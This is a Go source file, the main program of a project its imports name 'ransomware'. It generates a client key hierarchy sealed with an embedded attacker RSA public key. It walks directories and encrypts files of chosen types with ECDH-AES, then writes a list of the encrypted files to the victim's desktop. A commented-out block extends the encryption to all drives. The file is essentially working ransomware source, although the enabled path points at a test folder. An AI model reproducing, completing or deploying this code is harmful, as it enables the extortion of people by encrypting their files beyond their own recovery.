package main

import (
	"crypto/rsa"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"ransomware/encryption"
	"ransomware/encryption/eccLib"
	"ransomware/encryption/rsaLib"
	"ransomware/io"
	"ransomware/utils"
	"sync"
)

var (
	filesToVisit  = make(chan io.File)
	encryptedList []string
	waitGroup     sync.WaitGroup
	sPubKey       = rsaLib.DecodeRSAPublicKey(utils.SPubKeyPem)
)

func main() {

	clientPubKeys, err := generateClientKeys(sPubKey)
	if err != nil {
		panic(err)
	}

	currentDirectory, _ := os.Getwd()
	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
	encryptFiles(dir, clientPubKeys)

	// drives := io.GetDrives()
	// for _, drive := range drives {
	// 	encryptFiles(drive, cPubKey)
	// }

	defer generateDesktopFiles()
}

func generateClientKeys(servPubKey *rsa.PublicKey) ([]*eccLib.ExtendedPublicKey, error) {

	var i uint16
	var childsNumber uint16 = utils.FileTypeLenght
	cMasterKey := eccLib.GenerateMasterPrivKey()

	var pubChildKeys = make([]*eccLib.ExtendedPublicKey, childsNumber)

	masterBytes := eccLib.SerializeExtendedPrivateKey(*cMasterKey)
	masterBytesEncrypted, err := encryption.RSAAESEncrypt(masterBytes, servPubKey)
	if err != nil {
		return nil, err
	}

	keyFile, err := os.Create("cMasterKey.encrypted")
	if err != nil {
		return nil, err
	}
	_, err = keyFile.Write(masterBytesEncrypted)
	if err != nil {
		return nil, err
	}

	for i = 0; i < childsNumber; i++ {
		pubChildKeys[i], err = recurDerivPubKey(cMasterKey, i+1, childsNumber, 3)
		if err != nil {
			fmt.Println("Failed to derive child key for index ", i+1)
		}
	}

	return pubChildKeys, nil
}

// Tries to derive child key for index i. There is a probability lower than 1 in 2^127 that a
// a given index is invalid for child derivation (https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki#private-parent-key--private-child-key). In that case, returns child of index i + dI.
// Recursive tries this method "tries" times
func recurDerivPubKey(
	parentKey *eccLib.ExtendedPrivateKey,
	i uint16,
	dI uint16,
	tries int,
) (*eccLib.ExtendedPublicKey, error) {

	if tries > 0 {
		childKey, err := eccLib.PubChildDeriv(*parentKey, i)
		if err == nil {
			return childKey, nil
		}
	} else {
		return nil, errors.New("Failed to generate child key")
	}

	return recurDerivPubKey(parentKey, i+dI, dI, tries-1)
}

func encryptFiles(dirPath string, pubKeys []*eccLib.ExtendedPublicKey) {

	var ext string
	var err error

	waitGroup.Add(1)
	go func() {
		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {

			if d.IsDir() {

				if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
					return filepath.SkipDir
				}
			}

			if !d.IsDir() {
				info, err := d.Info()
				if err != nil {
					return err
				}
				ext = filepath.Ext(path)
				if ext != ".encrypted" {
					filesToVisit <- io.File{Info: info, Path: path, Extension: ext[1:]}
				}
			}
			return nil
		})

		defer close(filesToVisit)
		defer waitGroup.Done()
	}()

	waitGroup.Add(1)
	go func() {
		for file := range filesToVisit {

			fileType, mapContains := utils.FileType[file.Extension]

			if mapContains {
				err = io.EncryptFile(&file, encryption.ECDHAESEncrypt, &pubKeys[fileType].PublicKey)
				if err == nil {
					encryptedList = append(encryptedList, file.Path)
				}

			}

		}
		defer waitGroup.Done()
	}()

	waitGroup.Wait()
}

func generateDesktopFiles() {

	var text string = "------ENCRYPTED FILES------\n\n"
	desktopPath, err := utils.GetDesktopPath()
	if err != nil {
		panic(err)
	}

	for _, filePath := range encryptedList {
		text = text + filePath + "\n"
	}
	bytes := []byte(text)
	os.WriteFile(desktopPath+"/ENCRYPTED_FILES.txt", bytes, 0644)
}
